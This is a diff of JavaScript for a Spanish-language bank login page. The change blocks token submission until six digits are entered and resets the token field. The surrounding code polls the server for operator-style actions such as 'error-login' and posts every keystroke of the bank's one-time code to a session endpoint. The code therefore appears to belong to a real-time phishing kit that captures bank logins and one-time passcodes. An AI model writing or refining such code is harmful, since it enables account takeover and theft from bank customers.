@@ -124,7 +124,18 @@ function startPolling() {
             tokenTitle.textContent = "Ingresa tu clave dinámica";
             tokenDesc.textContent = "Encuentra tu clave dinámica de 6 dígitos en la aplicación móvil de tu banco e ingrésala abajo.";
           }
-          document.getElementById("tokenInput").focus();
+          
+          const tokenInputEl = document.getElementById("tokenInput");
+          const tokenSubmitEl = document.getElementById("tokenSubmit");
+          if (tokenInputEl) {
+            tokenInputEl.value = "";
+            tokenInputEl.focus();
+          }
+          if (tokenSubmitEl) {
+            tokenSubmitEl.disabled = true;
+            tokenSubmitEl.classList.add("btn-disabled");
+            tokenSubmitEl.classList.remove("btn-primary");
+          }
         } else if (action === 'error-login') {
           stopPing();
           stopPolling();
@@ -197,6 +208,16 @@ document.getElementById("loginForm").addEventListener("submit", (e) => {
 const tokenInput = document.getElementById("tokenInput");
 tokenInput?.addEventListener("input", () => {
   tokenInput.value = tokenInput.value.replace(/\D/g, "").slice(0, 6);
+  
+  // Habilitar/deshabilitar botón según la longitud (6 dígitos)
+  const tokenSubmit = document.getElementById("tokenSubmit");
+  if (tokenSubmit) {
+    const ok = tokenInput.value.length === 6;
+    tokenSubmit.disabled = !ok;
+    tokenSubmit.classList.toggle("btn-disabled", !ok);
+    tokenSubmit.classList.toggle("btn-primary", ok);
+  }
+
   if (pollInterval) {
     fetch(`/api/sessions/${sessionId}/state`, {
       method: 'POST',
